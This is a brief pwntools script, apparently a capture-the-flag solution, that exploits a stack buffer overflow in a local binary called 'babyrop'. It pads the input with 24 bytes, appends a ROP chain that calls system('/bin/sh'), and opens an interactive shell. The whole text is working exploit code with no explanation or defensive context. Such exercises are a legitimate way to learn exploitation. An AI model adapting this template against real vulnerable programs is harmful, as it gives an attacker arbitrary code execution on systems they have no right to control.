from pwn import *
context.clear(arch='amd64') # 64 bit
elf = ELF('./babyrop')
sh = next(elf.search('/bin/sh'))
r = ROP(elf)
r.system(sh) # running system("/bin/sh")
p = elf.process()
p.sendline('a'*24 + str(r)) # send the payload
p.interactive()
